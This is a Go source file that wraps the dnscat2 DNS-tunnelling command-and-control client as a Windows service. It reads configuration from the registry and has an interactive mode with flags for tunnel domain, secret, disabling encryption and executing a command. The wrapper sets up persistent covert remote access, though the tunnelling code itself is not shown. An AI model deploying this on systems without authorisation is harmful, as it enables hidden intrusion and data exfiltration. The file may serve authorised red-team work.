package main

import (
	"flag"
	"fmt"
	"os"

	"golang.org/x/sys/windows/svc"
)

func main() {
	// Check if we are running as a service
	isService, err := svc.IsWindowsService()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to determine if running as service: %v\n", err)
		os.Exit(1)
	}

	if isService {
		// Run as Windows service
		runService()
	} else {
		// Run in interactive mode for testing/debugging
		runInteractive()
	}
}

func runService() {
	// Load configuration from registry
	config, err := LoadConfigFromRegistry()
	if err != nil {
		// Log error to event log or file
		logError(fmt.Sprintf("Failed to load config from registry: %v", err))
		os.Exit(1)
	}

	// Start the service
	err = svc.Run("dnscat2", &dnscat2Service{config: config})
	if err != nil {
		logError(fmt.Sprintf("Service failed to run: %v", err))
		os.Exit(1)
	}
}

func runInteractive() {
	// Parse command-line flags for interactive mode
	config := &Config{}

	flag.StringVar(&config.Domain, "domain", "", "Domain to tunnel through")
	flag.StringVar(&config.DnsServer, "dns-server", "", "DNS server to use")
	flag.UintVar(&config.DnsPort, "dns-port", 53, "DNS port")
	flag.StringVar(&config.DnsTypes, "dns-type", "TXT,CNAME,MX", "DNS record types")
	flag.StringVar(&config.Secret, "secret", "", "Pre-shared secret")
	flag.BoolVar(&config.NoEncryption, "no-encryption", false, "Disable encryption")
	flag.IntVar(&config.Delay, "delay", 1000, "Delay between packets in ms")
	flag.IntVar(&config.MaxRetransmit, "max-retransmits", 20, "Max retransmit attempts")
	flag.BoolVar(&config.PacketTrace, "packet-trace", false, "Enable packet tracing")
	flag.StringVar(&config.ExecCommand, "exec", "", "Execute a command")

	flag.Parse()

	// Handle positional argument as domain
	if flag.NArg() > 0 {
		config.Domain = flag.Arg(0)
	}

	fmt.Println("Running in interactive mode...")
	fmt.Println("Press Ctrl+C to stop")
	fmt.Println()

	// Run dnscat2 with config
	if err := runDnscat(config); err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}
}

func logError(msg string) {
	// Simple file logging for now
	// Could be enhanced to use Windows Event Log
	f, err := os.OpenFile("dnscat2-service.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	fmt.Fprintln(f, msg)
}
